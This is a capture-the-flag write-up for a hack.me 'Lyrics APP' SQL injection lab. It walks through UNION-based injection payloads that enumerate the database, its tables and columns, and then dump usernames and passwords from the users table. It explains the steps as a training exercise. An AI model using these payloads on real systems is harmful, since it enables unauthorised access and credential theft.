this is a solution for  https://hack.me/t/SQLi

Lyrics APP by killerbyte:

I take this from here and make it more convenient and add some extra explanation:

look at the source code in the comment we find

<!-- Debug INFO: To access with guest account use: guest/guest -->

So let try this

again in the source code we find :

xmlhttp.open("GET", "api.php?id="+lyric_id, true);
xmlhttp.send();

I use burp suite and I will show it here!

we put 444 in the params the answer we get is all the columns something like this:

as you can see we get 4 columns
so let’s check if we can inject some code:

444+union+select+1,2,3,4

( The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. )

the answer is:

in order to see user/password from DB, we need to know the name of the DB ( database() ) so:

444+union+select+version(),database(),null,null

 

let’s find out what tables we have in DB:

444+union+select+group_concat(table_name),null,null,null+from
+information_schema.tables+where+table_schema%3d'lyrics_app_db'

group_concat() –  function returns a string with concatenated non-NULL value from a group.

%3d – translate to URL decoder is =

so the tables are lyrics, users –> users look interesting
let’s go deeper:

444+union+select+group_concat(column_name),null,null,null+from+information_schema.columns+
where+table_schema%3d'lyrics_app_db'+and+table_name%3d'users'

 

now we dump all:

444+union+select+group_concat(id,username,password),null,null,null+from+users
